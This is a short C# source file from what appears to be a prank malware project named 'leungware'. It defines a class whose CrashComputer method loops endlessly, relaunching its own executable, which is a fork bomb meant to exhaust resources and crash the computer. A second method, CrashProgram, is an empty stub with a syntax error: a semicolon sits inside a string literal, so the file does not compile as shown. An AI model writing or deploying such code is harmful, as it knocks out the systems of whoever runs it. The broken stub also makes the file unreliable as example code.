using System;
using System.Diagnostics;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;

namespace leungware_v420
{
    public class BreakComputerClass
    {
        public bool BreakComputer = false;
        public bool CrashProgramVar = false;
        public void CrashComputer()
        {
            while (BreakComputer)
            {
                Process.Start(Assembly.GetExecutingAssembly().Location);
            }
        }

        public unsafe void CrashProgram()
        {
            if (CrashProgramVar)
            {
                string str = "append1";
                string st2r2 = "append2;"
            }
        }

    }
}